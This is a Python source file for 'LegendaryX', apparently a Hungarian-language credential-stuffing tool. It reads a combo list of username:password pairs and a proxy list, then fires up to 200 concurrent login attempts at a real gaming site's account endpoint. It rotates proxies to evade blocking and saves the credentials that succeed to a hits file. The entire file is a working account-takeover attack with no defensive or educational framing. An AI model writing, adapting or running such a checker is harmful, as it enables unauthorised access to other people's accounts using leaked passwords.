from os import system, path, makedirs
from time import sleep
from yaml import safe_load
from easygui import fileopenbox
from requests import Session
from datetime import datetime
from threading import Thread, active_count
from console.utils import set_title
from requests.exceptions import InvalidProxyURL, InvalidURL, ReadTimeout

settings = '''#                               __                           __                  _  __
#                              / /  ___  ___ _ ___  ___  ___/ /___ _ ____ __ __ | |/_/
#                             / /__/ -_)/ _ `// -_)/ _ \/ _  // _ `// __// // /_>  <
#                            /____/\__/ \_, / \__//_//_/\_,_/ \_,_//_/   \_, //_/|_|
#                                      /___/                            /___/
Settings:
  #Hány checker fusson egyszerre maximum
  threads: 200

  #Proxy típus (socks4, socks5, https)
  proxy_type: socks4

  #Hány másodpercet várjon a weboldal betöltéséhez
  timeout: 8'''
if path.exists('Settings.yml'):
  settings = safe_load(open('Settings.yml', 'r', errors='ignore'))
else:
  open('Settings.yml', 'w').write(settings)
  settings = safe_load(open('Settings.yml', 'r', errors='ignore'))

class objects:
  def clear():
      _ = system('cls')

  def print_logo():
    print(f'''{color.yellow}\n                               __                           __                  _  __
                              / /  ___  ___ _ ___  ___  ___/ /___ _ ____ __ __ | |/_/
                             / /__/ -_)/ _ `// -_)/ _ \/ _  // _ `// __// // /_>  <
                            /____/\__/ \_, / \__//_//_/\_,_/ \_,_//_/   \_, //_/|_|
                                      /___/                            /___/         ''')

class vars:
  dt_string = datetime.now().strftime("[%d-%m-%Y %H-%M-%S]")
  proxy_type = str(settings['Settings']['proxy_type'])
  proxy_list = None
  current_proxy = 0
  count_cpm = True
  checking = False
  timeout = int(settings['Settings']['timeout'])
  valid = 0
  invalid = 0
  error = 0
  total = 0
  threads = int(settings['Settings']['threads'])
  checked = 0
  cpm = 0

class color:
  b = '\u001b[31;1m'
  red = '\u001b[31m'
  green = '\u001b[32m'
  blue = '\u001b[34m'
  yellow = '\u001b[33m'

class Main:
  def __init__(self):
    objects.clear()
    objects.print_logo()
    self.prepare()

  def set_title(self):
    while vars.checking:
      set_title(f'LegendaryX v1.0 | Hits: {vars.valid} Invalid: {vars.invalid} Checked: {vars.checked}/{vars.total} | Nandi')
      sleep(0.1)

  def results_screen(self):
    objects.clear()
    objects.print_logo()
    print('')
    icon = f'{color.red}[{color.yellow}~{color.red}]{color.yellow}'
    while vars.checking:
      print(f'''                                        {icon} Checked: {vars.checked}/{vars.total}
                                        {icon} Running Threads: {active_count() - 3}/{vars.threads}
                                        {icon} Invalid: {vars.invalid}\n
                                        {icon} Hits: {vars.valid}\n
                                        {icon} Errors: {vars.error}
                                        {icon} CPM: {vars.cpm}''')
      for i in range(8):
        print("\033[A                             \033[A")
      sleep(0.1)

  def cpm_counter(self):
    while vars.checking:
        if vars.checked >= 1:
            now = vars.checked
            sleep(3)
            vars.cpm = (vars.checked - now) * 20

  def prepare(self):
    combolist = ''
    proxies = ''
    current_user = 0
    sleep(0.5)
    print('\n\nVálaszd ki a combolistát...')
    sleep(1)
    while combolist == '':
      try:
        combolist = open(fileopenbox(title="Combolist", default="*.txt"), 'r', encoding='utf-8')
      except:
        sleep(1)
    combo_list = combolist.readlines()
    print('\nVálaszd ki a proxikat...')
    while proxies == '':
      try:
        proxies = open(fileopenbox(title="Proxies", default="*.txt"), 'r', encoding='utf-8')
      except:
        sleep(1)
    vars.proxy_list = proxies.readlines()
    vars.checking = True
    if vars.threads > len(combo_list):
      vars.threads = int(len(combo_list))
    if not path.exists('Results'):
      makedirs('Results')
    if not path.exists(f'Results\\{vars.dt_string}'):
      makedirs(f'Results\\{vars.dt_string}')

    vars.total = int(len(combo_list))
    title_thread = Thread(target=self.set_title,).start()
    results_thread = Thread(target=self.results_screen,).start()
    cpm_thread = Thread(target=self.cpm_counter,).start()
    while int(current_user) < int(len(combo_list)) - 1:
      user_data = combo_list[current_user].split(':')
      while active_count() - 1 >= vars.threads:
        sleep(1)
      if active_count() - 2 < vars.threads:
        Thread(target=self.LegendaryMC, args=(user_data[0], user_data[1].replace('\n', ''),)).start()
        current_user += 1
    while vars.remaining != vars.total:
      sleep(1)

  def LegendaryMC(self, username, password):
    run = True
    while run:
      try:
        tt = f'{vars.proxy_type}://{vars.proxy_list[vars.current_proxy]}'.replace('\n', '')
      except:
        vars.current_proxy = 0
        tt = f'{vars.proxy_type}://{vars.proxy_list[vars.current_proxy]}'.replace('\n', '')

      try:
        with Session() as s:
          response = s.post('http://account.legendary.hu/index.php/auth/login', headers={'Accept': '*/*', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x32; rv:88.0) Gecko/20100101 Firefox/87.0',}, data={'loginname': username, 'password': password,}, proxies={'https':tt}, timeout=vars.timeout)
          run = False
      except ReadTimeout:
        vars.proxy_list.pop(vars.current_proxy)
        vars.error += 1
      except:
        vars.current_proxy += 1
        vars.error += 1
      if not run:
        if 'Hib' in response.text:
          vars.invalid += 1
          vars.checked += 1
          break
        elif '"success":true' in response.text:
          vars.checked += 1
          vars.valid += 1
          with open(f'Results\\{vars.dt_string}\\hits.txt', 'a') as f:
            f.write(f'{username}:{password}')
          break


if __name__ == '__main__':
  set_title('LegendaryX v1.0 | Nandi')
  Main()
